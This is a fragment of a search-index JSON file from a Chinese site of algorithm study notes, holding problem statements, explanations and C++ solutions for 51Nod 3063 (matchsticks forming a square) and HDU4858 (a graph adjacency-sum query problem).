Description"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/%E7%AE%80%E5%8D%95%E9%A2%98/4.51Nod_3063_%E5%B0%8F%E6%98%8E%E7%88%B1%E6%AD%A3%E6%96%B9%E5%BD%A2/#13-input","text":"\u7b2c\u4e00\u884c\u4e00\u4e2a\u6570 T \uff0c\u8868\u793a\u6570\u636e\u7684\u7ec4\u6570 (1 \\le T \\le 10) \uff1b \u5bf9\u4e8e\u6bcf\u7ec4\u6570\u636e\uff0c \u7b2c\u4e00\u884c\u8f93\u5165\u4e00\u4e2a\u6570 n \uff0c\u8868\u793a\u706b\u67f4\u7684\u6570\u76ee\uff0c\u5176\u4e2d 1 \\le n\\le 15 \uff1b \u7b2c\u4e8c\u884c n \u4e2a\u6570\u8868\u793a\u6bcf\u6839\u706b\u67f4\u7684\u957f\u5ea6\uff0c\u5176\u4e2d\u706b\u67f4\u957f\u5ea6\u603b\u548c \\le 10^9 \u3002","title":"1.3. Input"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/%E7%AE%80%E5%8D%95%E9%A2%98/4.51Nod_3063_%E5%B0%8F%E6%98%8E%E7%88%B1%E6%AD%A3%E6%96%B9%E5%BD%A2/#14-output","text":"\u5bf9\u4e8e\u6bcf\u7ec4\u6570\u636e\u8f93\u51fa\u4e00\u884c\uff0c\u5982\u679c\u6240\u6709\u7684\u706b\u67f4\u53ef\u4ee5\u62fc\u6210\u6b63\u65b9\u5f62\uff0c\u8f93\u51fa true \uff0c\u5426\u8005\u8f93\u51fa false \u3002","title":"1.4. Output"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/%E7%AE%80%E5%8D%95%E9%A2%98/4.51Nod_3063_%E5%B0%8F%E6%98%8E%E7%88%B1%E6%AD%A3%E6%96%B9%E5%BD%A2/#15-sample-input","text":"1 5 1 1 2 2 2","title":"1.5. Sample Input"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/%E7%AE%80%E5%8D%95%E9%A2%98/4.51Nod_3063_%E5%B0%8F%E6%98%8E%E7%88%B1%E6%AD%A3%E6%96%B9%E5%BD%A2/#16-sample-output","text":"true","title":"1.6. Sample Output"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/%E7%AE%80%E5%8D%95%E9%A2%98/4.51Nod_3063_%E5%B0%8F%E6%98%8E%E7%88%B1%E6%AD%A3%E6%96%B9%E5%BD%A2/#17-source","text":"51Nod 3063 \u5c0f\u660e\u7231\u6b63\u65b9\u5f62","title":"1.7. Source"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/%E7%AE%80%E5%8D%95%E9%A2%98/4.51Nod_3063_%E5%B0%8F%E6%98%8E%E7%88%B1%E6%AD%A3%E6%96%B9%E5%BD%A2/#2","text":"\u8bbe\u706b\u67f4\u957f\u5ea6\u4e3a a_i \uff0c\u9996\u5148\u5bf9\u6240\u6709\u7684\u706b\u67f4\u8fdb\u884c\u6c42\u548c\uff0c\u5f97\u5230 length = \\sum_{i = 1}^n a_i \uff0c\u7136\u540e\u8ba1\u7b97 length \u662f\u5426\u80fd\u88ab 4 \u6574\u9664\uff0c\u82e5\u4e0d\u80fd\uff0c\u8f93\u51fa false \u3002 \u82e5 length \u80fd\u88ab 4 \u6574\u9664\uff0c\u5c06\u6240\u6709\u7684\u706b\u67f4\u964d\u5e8f\u6392\u5e8f\uff0c\u5224\u65ad\u6700\u957f\u7684\u706b\u67f4 \\max a_i \u662f\u5426\u5927\u4e8e length \uff0c\u82e5\u662f\uff0c\u8f93\u51fa false \u3002 \u82e5\u4e0d\u662f\uff0c\u5047\u8bbe\u5f53\u524d\u8fd8\u9700\u8981\u7684\u8fb9\u957f\u957f\u5ea6\u4e3a buffer \uff0c\u5bf9\u6240\u6709\u7684\u706b\u67f4\u8fdb\u884c 4 \u6b21\u964d\u5e8f\u904d\u5386\uff0c\u5982\u679c\u706b\u67f4\u957f\u5ea6 a_i \\le buffer \uff0c\u5219\u8be5\u706b\u67f4\u88ab\u9009\u53d6\uff0c buffer = buffer - a_i \uff0c\u5e76\u5c06 a_i \u7f6e\u4e3a 0 \u3002 \u5982\u679c\u6bcf\u6b21\u904d\u5386\u5b8c\u4ee5\u540e buffer \u90fd\u4e3a 0 \uff0c\u5373 4 \u6761\u8fb9\u90fd\u88ab\u706b\u67f4\u62fc\u51d1\u51fa\u6765\u4e86\uff0c\u5219\u8f93\u51fa true \uff0c\u5426\u5219\u8f93\u51fa false \u3002","title":"2. \u89e3\u8bfb"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/%E7%AE%80%E5%8D%95%E9%A2%98/4.51Nod_3063_%E5%B0%8F%E6%98%8E%E7%88%B1%E6%AD%A3%E6%96%B9%E5%BD%A2/#3","text":"#include <algorithm> #include <iostream> #include <string.h> using namespace std; const int NUM = 15; // \u5b58\u50a8 long long list[NUM]; // \u5b9a\u4e49\u964d\u5e8f\u6392\u5e8f\u89c4\u5219 bool cmp(long long a, long long b) { return a > b; } int main() { // test case int t, n; scanf(\"%d\", &t); // sum \u5b58\u50a8\u6240\u6709\u706b\u67f4\u7684\u6c42\u548c long long sum; // flag \u5b58\u50a8\u7ed3\u679c bool flag; // buffer long long buffer, inputBuffer; // length \u5b58\u50a8\u6b63\u65b9\u5f624\u6761\u8fb9\u7684\u957f\u5ea6 long long length; // \u8f93\u5165 for (int i = 0; i < t; i++) { // \u521d\u59cb\u5316 memset(list, 0, sizeof(list)); sum = 0; flag = true; // \u8f93\u5165 scanf(\"%d\", &n); for (int j = 0; j < n; j++) { scanf(\"%lld\", &inputBuffer); list[j] = inputBuffer; // \u7d2f\u52a0 sum += inputBuffer; } // \u964d\u5e8f\u6392\u5e8f sort(list, list + n, cmp); // \u8ba1\u7b97 // \u82e5\u4e0d\u80fd\u5206\u4e3a4\u6761\u8fb9 if (sum % 4 != 0 || list[0] > sum / 4) { flag = false; } else { // \u82e5\u80fd\u591f\u5206\u4e3a4\u6761\u8fb9 // \u8ba1\u7b97\u6bcf\u6761\u8fb9\u7684\u957f\u5ea6 length = sum / 4; for (int j = 0; j < 4; j++) { // \u7528buffer\u5b58\u50a8\u9700\u8981\u7684\u957f\u5ea6 buffer = length; for (int k = 0; k < n; k++) { // \u82e5\u9700\u8981\u7684\u957f\u5ea6\u5927\u4e8e\u706b\u67f4\u957f\u5ea6 if (buffer >= list[k]) { // \u9009\u62e9\u8be5\u6839\u706b\u67f4 buffer -= list[k]; // \u957f\u5ea6\u7f6e\u4e3a0 list[k] = 0; // \u82e5\u9700\u8981\u7684\u957f\u5ea6\u4e3a0\u65f6\u5219\u9000\u51fa\u5faa\u73af if (buffer == 0) { break; } } } // \u82e5\u4e0d\u80fd\u7528\u706b\u67f4\u51d1\u51fa\u9700\u8981\u7684\u8fb9\u957f if (buffer > 0) { flag = false; break; } } } // \u8f93\u51fa printf(\"%s\\n\", flag ? \"true\" : \"false\"); } } \u8054\u7cfb\u90ae\u7bb1\uff1acurren_wong@163.com Github\uff1a https://github.com/CurrenWong \u6b22\u8fce\u8f6c\u8f7d/Star/Fork\uff0c\u6709\u95ee\u9898\u6b22\u8fce\u901a\u8fc7\u90ae\u7bb1\u4ea4\u6d41\u3002","title":"3. \u4ee3\u7801"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/%E7%AE%80%E5%8D%95%E9%A2%98/5.HDU4858_%E9%A1%B9%E7%9B%AE%E7%AE%A1%E7%90%86/","text":"HDU4858 \u9879\u76ee\u7ba1\u7406 # \u76ee\u5f55 # HDU4858 \u9879\u76ee\u7ba1\u7406 \u76ee\u5f55 1. \u9898\u76ee\u63cf\u8ff0 1.1. Limit 1.2. Problem Description 1.3. Input 1.4. Output 1.5. Sample Input 1.6. Sample Output 1.7. Source 2. \u89e3\u8bfb 3. \u4ee3\u7801 1. \u9898\u76ee\u63cf\u8ff0 # 1.1. Limit # Time Limit: 2000/1000 MS (Java/Others) Memory Limit: 32768/32768 K (Java/Others) 1.2. Problem Description # \u6211\u4eec\u5efa\u9020\u4e86\u4e00\u4e2a\u5927\u9879\u76ee\uff01\u8fd9\u4e2a\u9879\u76ee\u6709 n \u4e2a\u8282\u70b9\uff0c\u7528\u5f88\u591a\u8fb9\u8fde\u63a5\u8d77\u6765\uff0c\u5e76\u4e14\u8fd9\u4e2a\u9879\u76ee\u662f\u8fde\u901a\u7684\uff01 \u4e24\u4e2a\u8282\u70b9\u95f4\u53ef\u80fd\u6709\u591a\u6761\u8fb9\uff0c\u4e0d\u8fc7\u4e00\u6761\u8fb9\u7684\u4e24\u7aef\u5fc5\u7136\u662f\u4e0d\u540c\u7684\u8282\u70b9\u3002 \u6bcf\u4e2a\u8282\u70b9\u90fd\u6709\u4e00\u4e2a\u80fd\u91cf\u503c\u3002 \u73b0\u5728\u6211\u4eec\u8981\u7f16\u5199\u4e00\u4e2a\u9879\u76ee\u7ba1\u7406\u8f6f\u4ef6\uff0c\u8fd9\u4e2a\u8f6f\u4ef6\u5462\u6709\u4e24\u4e2a\u64cd\u4f5c\uff1a \u7ed9\u67d0\u4e2a\u9879\u76ee\u7684\u80fd\u91cf\u503c\u52a0\u4e0a\u4e00\u4e2a\u7279\u5b9a\u503c\u3002 \u8be2\u95ee\u8ddf\u4e00\u4e2a\u9879\u76ee\u76f8\u90bb\u7684\u9879\u76ee\u7684\u80fd\u91cf\u503c\u4e4b\u548c\u3002\uff08\u5982\u679c\u6709\u591a\u6761\u8fb9\u5c31\u7b97\u591a\u6b21\uff0c\u6bd4\u5982 a \u548c b \u6709 2 \u6761\u8fb9\uff0c\u90a3\u4e48\u8be2\u95ee a \u7684\u65f6\u5019 b \u7684\u6743\u503c\u7b97 2 \u6b21\uff09\u3002 1.3. Input # \u7b2c\u4e00\u884c\u4e00\u4e2a\u6574\u6570 T(1 <= T <= 3) ,\u8868\u793a\u6d4b\u8bd5\u6570\u636e\u7684\u4e2a\u6570\u3002 \u7136\u540e\u5bf9\u4e8e\u6bcf\u4e2a\u6d4b\u8bd5\u6570\u636e\uff0c\u7b2c\u4e00\u884c\u6709\u4e24\u4e2a\u6574\u6570 n(1 <= n <= 100000) \u548c m(1 <= m <= n + 10) \uff0c\u5206\u522b\u8868\u793a\u70b9\u6570\u548c\u8fb9\u6570\u3002 \u7136\u540e m \u884c\uff0c\u6bcf\u884c\u4e24\u4e2a\u6570 a \u548c b \uff0c\u8868\u793a a \u548c b \u4e4b\u95f4\u6709\u4e00\u6761\u8fb9\u3002 \u7136\u540e\u4e00\u4e2a\u6574\u6570 Q \u3002 \u7136\u540e Q \u884c\uff0c\u6bcf\u884c\u7b2c\u4e00\u4e2a\u6570 cmd \u8868\u793a\u64cd\u4f5c\u7c7b\u578b\u3002\u5982\u679c cmd \u4e3a 0 \uff0c\u90a3\u4e48\u63a5\u4e0b\u6765\u4e24\u4e2a\u6570 u\\ v \u8868\u793a\u7ed9\u9879\u76ee u \u7684\u80fd\u91cf\u503c\u52a0\u4e0a v(0 <= v <= 100) \u3002 \u5982\u679c cmd \u4e3a 1 \uff0c\u90a3\u4e48\u63a5\u4e0b\u6765\u4e00\u4e2a\u6570 u \u8868\u793a\u8be2\u95ee u \u76f8\u90bb\u7684\u9879\u76ee\u7684\u80fd\u91cf\u503c\u4e4b\u548c\u3002 \u6240\u6709\u70b9\u4ece 1 \u5230 n \u6807\u53f7\u3002 1.4. Output # \u5bf9\u6bcf\u4e2a\u8be2\u95ee\uff0c\u8f93\u51fa\u4e00\u884c\u8868\u793a\u7b54\u6848\u3002 1.5. Sample Input # 1 3 2 1 2 1 3 6 0 1 15 0 3 4 1 1 1 3 0 2 33 1 2 1.6. Sample Output # 4 15 15 1.7. Source # BestCoder Round #1 2. \u89e3\u8bfb # \u770b\u5230\u9898\u76ee\u4e2d\u7684\u8282\u70b9\u548c\u8fde\u8fb9\uff0c\u6211\u4eec\u5f88\u81ea\u7136\u5730\u4f1a\u60f3\u5230\u7528\u56fe\u53bb\u5b58\u50a8\uff0c\u4f46\u662f \u8282\u70b9\u6700\u5927\u6570\u91cf\u662f 10\u4e07\uff0c\u8981\u5b58\u4e00\u4e2a10\u4e07x10\u4e07\u7684\u4e8c\u7ef4\u6570\u7ec4\u975e\u5e38\u5bb9\u6613\u7206\u5185\u5b58\u3002\u800c\u4ece\u9898\u76ee\u4e2d\u6211\u4eec\u53ef\u4ee5\u53d1\u73b0\uff0c\u8fd9\u4e2a\u56fe\u7684\u8fde\u8fb9\u662f\u6bd4\u8f83\u7a00\u758f\u7684\uff0c\u6240\u4ee5\u6211\u4eec\u53ef\u4ee5\u91c7\u7528\u90bb\u63a5\u8868\u7684\u65b9\u5f0f\u8fdb\u884c\u5b58\u50a8\u3002 \u7528\u90bb\u63a5\u8868\u5b58\u50a8\u4e86\u70b9\u548c\u8fde\u8fb9\u7684\u5173\u7cfb\u4e4b\u540e\uff0c\u6211\u4eec\u518d\u7528\u4e00\u4e2a\u6570\u7ec4\u53bb\u5b58\u50a8\u6bcf\u4e00\u4e2a\u8282\u70b9\u7684\u76f8\u90bb\u8282\u70b9\u80fd\u91cf\u4e4b\u548c\u3002\u5728\u67d0\u4e00\u4e2a\u8282\u70b9\u80fd\u91cf\u589e\u52a0\u4e4b\u540e\uff0c\u589e\u52a0\u6240\u6709\u4e0e\u5176\u76f8\u90bb\u7684\u8282\u70b9\u7684\u80fd\u91cf\uff0c\u6709\u67e5\u8be2\u8bf7\u6c42\u65f6\u76f4\u63a5\u8f93\u51fa\u5373\u53ef\u3002 \u6211\u67e5\u4e86\u7f51\u4e0a\u7684\u4e00\u4e9b\u5176\u4ed6\u89e3\u8bfb\uff0c\u636e\u8bf4\u8fd9\u91cc\u7528\u5230\u4e86\u4e00\u79cd\u7b97\u6cd5\u53eb\u505a \u5206\u5757\u7b97\u6cd5 \uff0c\u611f\u5174\u8da3\u7684\u540c\u5b66\u53ef\u4ee5\u4e86\u89e3\u4e00\u4e0b\u3002 3. \u4ee3\u7801 # #define mill 100010 #include <iostream> #include <stdio.h> #include <string.h> #include <vector> using namespace std; int main() { // test case int t; scanf(\"%d\", &t); // Buffer long long list[mill]; // \u58f0\u660e\u90bb\u63a5\u8868 vector<int> vec_list[mill]; for (int j = 0; j < t; j++) { // \u6e05\u7a7a\u90bb\u63a5\u8868 memset(vec_list, 0, sizeof(vec_list)); // \u6e05\u7a7aBuffer memset(list, 0, sizeof(list)); // \u8bfb\u6570\u636e int n, m; scanf(\"%d %d\", &n, &m); // \u8fde\u8fb9 int a, b; // \u5faa\u73afm\u6b21\uff0c\u8bfb\u5165\u8fde\u8fb9 for (int i = 0; i < m; i++) { scanf(\"%d %d\", &a, &b); // ---\u5b58\u5165ab----------- vec_list[a].push_back(b); // ---\u5b58\u5165ba----------- vec_list[b].push_back(a); } // \u8bfb\u53d6query // query\u4e2a\u6570 int q; scanf(\"%d\", &q); // query \u7c7b\u578b int qType; // query\u5185\u5bb9 int u, v; // \u8bfb\u5165query for (int i = 0; i < q; i++) { scanf(\"%d\", &qType); if (qType == 0) { scanf(\"%d %d\", &u, &v); // \u64cd\u4f5cquery 0 // \u8bfb\u8fde\u8fb9 vector<int> vec = vec_list[u]; // \u4e3a\u6bcf\u4e2a\u4e0eu\u76f8\u8fde\u7684\u70b9\u52a0v\u80fd\u91cf for (unsigned long k = 0; k < vec.size(); k++) { list[vec[k]] += v; } } else { scanf(\"%d\", &u); // \u64cd\u4f5cquery 1 printf(\"%lld\\n\", list[u]); } } } } \u8054\u7cfb\u90ae\u7bb1\uff1acurren_wong@163.com Github\uff1a https://github.com/CurrenWong \u6b22\u8fce\u8f6c\u8f7d/Star/Fork\uff0c\u6709\u95ee\u9898\u6b22\u8fce\u901a\u8fc7\u90ae\u7bb1\u4ea4\u6d41\u3002","title":"5.HDU4858 \u9879\u76ee\u7ba1\u7406"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/%E7%AE%80%E5%8D%95%E9%A2%98/5.HDU4858_%E9%A1%B9%E7%9B%AE%E7%AE%A1%E7%90%86/#hdu4858","text":"","title":"HDU4858 \u9879\u76ee\u7ba1\u7406"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/%E7%AE%80%E5%8D%95%E9%A2%98/5.HDU4858_%E9%A1%B9%E7%9B%AE%E7%AE%A1%E7%90%86/#_1","text":"HDU4858 \u9879\u76ee\u7ba1\u7406 \u76ee\u5f55 1. \u9898\u76ee\u63cf\u8ff0 1.1. Limit 1.2. Problem Description 1.3. Input 1.4. Output 1.5. Sample Input 1.6. Sample Output 1.7. Source 2. \u89e3\u8bfb 3. \u4ee3\u7801","title":"\u76ee\u5f55"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/%E7%AE%80%E5%8D%95%E9%A2%98/5.HDU4858_%E9%A1%B9%E7%9B%AE%E7%AE%A1%E7%90%86/#1","text":"","title":"1. \u9898\u76ee\u63cf\u8ff0"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/%E7%AE%80%E5%8D%95%E9%A2%98/5.HDU4858_%E9%A1%B9%E7%9B%AE%E7%AE%A1%E7%90%86/#11-limit","text":"Time Limit: 2000/1000 MS (Java/Others) Memory Limit: 32768/32768 K (Java/Others)","title":"1.1. Limit"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/%E7%AE%80%E5%8D%95%E9%A2%98/5.HDU4858_%E9%A1%B9%E7%9B%AE%E7%AE%A1%E7%90%86/#12-problem-description","text":"\u6211\u4eec\u5efa\u9020\u4e86\u4e00\u4e2a\u5927\u9879\u76ee\uff01\u8fd9\u4e2a\u9879\u76ee\u6709 n \u4e2a\u8282\u70b9\uff0c\u7528\u5f88\u591a\u8fb9\u8fde\u63a5\u8d77\u6765\uff0c\u5e76\u4e14\u8fd9\u4e2a\u9879\u76ee\u662f\u8fde\u901a\u7684\uff01 \u4e24\u4e2a\u8282\u70b9\u95f4\u53ef\u80fd\u6709\u591a\u6761\u8fb9\uff0c\u4e0d\u8fc7\u4e00\u6761\u8fb9\u7684\u4e24\u7aef\u5fc5\u7136\u662f\u4e0d\u540c\u7684\u8282\u70b9\u3002 \u6bcf\u4e2a\u8282\u70b9\u90fd\u6709\u4e00\u4e2a\u80fd\u91cf\u503c\u3002 \u73b0\u5728\u6211\u4eec\u8981\u7f16\u5199\u4e00\u4e2a\u9879\u76ee\u7ba1\u7406\u8f6f\u4ef6\uff0c\u8fd9\u4e2a\u8f6f\u4ef6\u5462\u6709\u4e24\u4e2a\u64cd\u4f5c\uff1a \u7ed9\u67d0\u4e2a\u9879\u76ee\u7684\u80fd\u91cf\u503c\u52a0\u4e0a\u4e00\u4e2a\u7279\u5b9a\u503c\u3002 \u8be2\u95ee\u8ddf\u4e00\u4e2a\u9879\u76ee\u76f8\u90bb\u7684\u9879\u76ee\u7684\u80fd\u91cf\u503c\u4e4b\u548c\u3002\uff08\u5982\u679c\u6709\u591a\u6761\u8fb9\u5c31\u7b97\u591a\u6b21\uff0c\u6bd4\u5982 a \u548c b \u6709 2 \u6761\u8fb9\uff0c\u90a3\u4e48\u8be2\u95ee a \u7684\u65f6\u5019 b \u7684\u6743\u503c\u7b97 2 \u6b21\uff09\u3002","title":"1.2. Problem Description"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/%E7%AE%80%E5%8D%95%E9%A2%98/5.HDU4858_%E9%A1%B9%E7%9B%AE%E7%AE%A1%E7%90%86/#13-input","text":"\u7b2c\u4e00\u884c\u4e00\u4e2a\u6574\u6570 T(1 <= T <= 3) ,\u8868\u793a\u6d4b\u8bd5\u6570\u636e\u7684\u4e2a\u6570\u3002 \u7136\u540e\u5bf9\u4e8e\u6bcf\u4e2a\u6d4b\u8bd5\u6570\u636e\uff0c\u7b2c\u4e00\u884c\u6709\u4e24\u4e2a\u6574\u6570 n(1 <= n <= 100000) \u548c m(1 <= m <= n + 10) \uff0c\u5206\u522b\u8868\u793a\u70b9\u6570\u548c\u8fb9\u6570\u3002 \u7136\u540e m \u884c\uff0c\u6bcf\u884c\u4e24\u4e2a\u6570 a \u548c b \uff0c\u8868\u793a a \u548c b \u4e4b\u95f4\u6709\u4e00\u6761\u8fb9\u3002 \u7136\u540e\u4e00\u4e2a\u6574\u6570 Q \u3002 \u7136\u540e Q \u884c\uff0c\u6bcf\u884c\u7b2c\u4e00\u4e2a\u6570 cmd \u8868\u793a\u64cd\u4f5c\u7c7b\u578b\u3002\u5982\u679c cmd \u4e3a 0 \uff0c\u90a3\u4e48\u63a5\u4e0b\u6765\u4e24\u4e2a\u6570 u\\ v \u8868\u793a\u7ed9\u9879\u76ee u \u7684\u80fd\u91cf\u503c\u52a0\u4e0a v(0 <= v <= 100) \u3002 \u5982\u679c cmd \u4e3a 1 \uff0c\u90a3\u4e48\u63a5\u4e0b\u6765\u4e00\u4e2a\u6570 u \u8868\u793a\u8be2\u95ee u \u76f8\u90bb\u7684\u9879\u76ee\u7684\u80fd\u91cf\u503c\u4e4b\u548c\u3002 \u6240\u6709\u70b9\u4ece 1 \u5230 n \u6807\u53f7\u3002","title":"1.3. Input"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/%E7%AE%80%E5%8D%95%E9%A2%98/5.HDU4858_%E9%A1%B9%E7%9B%AE%E7%AE%A1%E7%90%86/#14-output","text":"\u5bf9\u6bcf\u4e2a\u8be2\u95ee\uff0c\u8f93\u51fa\u4e00\u884c\u8868\u793a\u7b54\u6848\u3002","title":"1.4. Output"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/%E7%AE%80%E5%8D%95%E9%A2%98/5.HDU4858_%E9%A1%B9%E7%9B%AE%E7%AE%A1%E7%90%86/#15-sample-input","text":"1 3 2 1 2 1 3 6 0 1 15 0 3 4 1 1 1 3 0 2 33 1 2","title":"1.5. Sample Input"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/%E7%AE%80%E5%8D%95%E9%A2%98/5.HDU4858_%E9%A1%B9%E7%9B%AE%E7%AE%A1%E7%90%86/#16-sample-output","text":"4 15 15","title":"1.6. Sample Output"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/%E7%AE%80%E5%8D%95%E9%A2%98/5.HDU4858_%E9%A1%B9%E7%9B%AE%E7%AE%A1%E7%90%86/#17-source","text":"BestCoder Round #1","title":"1.7. Source"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/%E7%AE%80%E5%8D%95%E9%A2%98/5.HDU4858_%E9%A1%B9%E7%9B%AE%E7%AE%A1%E7%90%86/#2","text":"\u770b\u5230\u9898\u76ee\u4e2d\u7684\u8282\u70b9\u548c\u8fde\u8fb9\uff0c\u6211\u4eec\u5f88\u81ea\u7136\u5730\u4f1a\u60f3\u5230\u7528\u56fe\u53bb\u5b58\u50a8\uff0c\u4f46\u662f \u8282\u70b9\u6700\u5927\u6570\u91cf\u662f 10\u4e07\uff0c\u8981\u5b58\u4e00\u4e2a10\u4e07x10\u4e07\u7684\u4e8c\u7ef4\u6570\u7ec4\u975e\u5e38\u5bb9\u6613\u7206\u5185\u5b58\u3002\u800c\u4ece\u9898\u76ee\u4e2d\u6211\u4eec\u53ef\u4ee5\u53d1\u73b0\uff0c\u8fd9\u4e2a\u56fe\u7684\u8fde\u8fb9\u662f\u6bd4\u8f83\u7a00\u758f\u7684\uff0c\u6240\u4ee5\u6211\u4eec\u53ef\u4ee5\u91c7\u7528\u90bb\u63a5\u8868\u7684\u65b9\u5f0f\u8fdb\u884c\u5b58\u50a8\u3002 \u7528\u90bb\u63a5\u8868\u5b58\u50a8\u4e86\u70b9\u548c\u8fde\u8fb9\u7684\u5173\u7cfb\u4e4b\u540e\uff0c\u6211\u4eec\u518d\u7528\u4e00\u4e2a\u6570\u7ec4\u53bb\u5b58\u50a8\u6bcf\u4e00\u4e2a\u8282\u70b9\u7684\u76f8\u90bb\u8282\u70b9\u80fd\u91cf\u4e4b\u548c\u3002\u5728\u67d0\u4e00\u4e2a\u8282\u70b9\u80fd\u91cf\u589e\u52a0\u4e4b\u540e\uff0c\u589e\u52a0\u6240\u6709\u4e0e\u5176\u76f8\u90bb\u7684\u8282\u70b9\u7684\u80fd\u91cf\uff0c\u6709\u67e5\u8be2\u8bf7\u6c42\u65f6\u76f4\u63a5\u8f93\u51fa\u5373\u53ef\u3002 \u6211\u67e5\u4e86\u7f51\u4e0a\u7684\u4e00\u4e9b\u5176\u4ed6\u89e3\u8bfb\uff0c\u636e\u8bf4\u8fd9\u91cc\u7528\u5230\u4e86\u4e00\u79cd\u7b97\u6cd5\u53eb\u505a \u5206\u5757\u7b97\u6cd5 \uff0c\u611f\u5174\u8da3\u7684\u540c\u5b66\u53ef\u4ee5\u4e86\u89e3\u4e00\u4e0b\u3002","title":"2. \u89e3\u8bfb"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/%E7%AE%80%E5%8D%95%E9%A2%98/5.HDU4858_%E9%A1%B9%E7%9B%AE%E7%AE%A1%E7%90%86/#3","text":"#define mill 100010 #include <iostream> #include <stdio.h> #include <string.h> #include <vector> using namespace std; int main() { // test case int t; scanf(\"%d\", &t); // Buffer long long list[mill]; // \u58f0\u660e\u90bb\u63a5\u8868 vector<int> vec_list[mill]; for (int j = 0; j < t; j++) { // \u6e05\u7a7a\u90bb\u63a5\u8868 memset(vec_list, 0, sizeof(vec_list)); // \u6e05\u7a7aBuffer memset(list, 0, sizeof(list)); // \u8bfb\u6570\u636e int n, m; scanf(\"%d %d\", &n, &m); // \u8fde\u8fb9 int a, b; // \u5faa\u73afm\u6b21\uff0c\u8bfb\u5165\u8fde\u8fb9 for (int i = 0; i < m; i++) { scanf(\"%d %d\", &a, &b); // ---\u5b58\u5165ab----------- vec_list[a].push_back(b); // ---\u5b58\u5165ba----------- vec_list[b].push_back(a); } // \u8bfb\u53d6query // query\u4e2a\u6570 int q; scanf(\"%d\", &q); // query \u7c7b\u578b int qType; // query\u5185\u5bb9 int u, v; // \u8bfb\u5165query for (int i = 0; i < q; i++) { scanf(\"%d\", &qType); if (qType == 0) { scanf(\"%d %d\", &u, &v); // \u64cd\u4f5cquery 0 // \u8bfb\u8fde\u8fb9 vector<int> vec = vec_list[u]; // \u4e3a\u6bcf\u4e2a\u4e0eu\u76f8\u8fde\u7684\u70b9\u52a0v\u80fd\u91cf for (unsigned long k = 0; k < vec.size(); k++) { list[vec[k]] += v; } } else { scanf(\"%d\", &u); // \u64cd\u4f5cquery 1 printf(\"%lld\\n\", list[u]); } } } } \u8054\u7cfb\u90ae\u7bb1\uff1acurren_wong@163.com Github\uff1a https://github.com/CurrenWong \u6b22\u8fce\u8f6c\u8f7d/Star/Fork\uff0c\u6709\u95ee\u9898\u6b22\u8fce\u901a\u8fc7\u90ae\u7bb1\u4ea4\u6d41\u3002","title":"3. \u4ee3\u7801"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/%E7%AE%80%E5%8D%95%E9%A2%98/6.%E7%89%9B%E5%AE%A2%E7%BD%91_NC13812_Another_Server/","text":"\u725b\u5ba2\u7f51 NC13812 Another Server # \u76ee\u5f55 # \u725b\u5ba2\u7f51 NC13812 Another Server \u76ee\u5f55 1. \u9898\u76ee\u63cf\u8ff0 1.1. Limit 1.2. Problem Description 1.3. Input 1.4. Output 1.5. Sample 